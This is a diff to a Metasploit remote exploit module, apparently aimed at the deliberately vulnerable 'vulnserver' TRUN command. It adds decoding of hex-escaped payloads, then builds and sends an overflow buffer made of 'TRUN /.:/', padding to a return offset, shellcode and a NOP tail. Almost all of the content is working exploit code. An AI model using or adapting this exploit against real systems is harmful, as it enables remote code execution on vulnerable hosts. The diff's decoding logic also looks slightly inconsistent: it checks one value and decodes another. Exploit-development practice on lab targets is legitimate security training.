@@ -58,7 +58,12 @@ class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module 
     print_status("Connecting to target...")
     connect	# Connect to the target
 
-    shellcode = payload.encoded	# Generated and encoded shellcode
+    if datastore['PAYLOADSTR'] && !datastore['PAYLOADSTR'].empty?
+      shellcode = payload.encoded.gsub(/\\x([0-9a-fA-F]{2})/) { $1.to_i(16).chr }
+    else
+      shellcode = payload.encoded
+    end
+
     outbound = 'TRUN /.:/' + "A"*datastore['RETOFFSET'] + shellcode + "\x90" * 990 # Create the malicious string that will be sent to the target
 
     print_status("Sending Exploit")
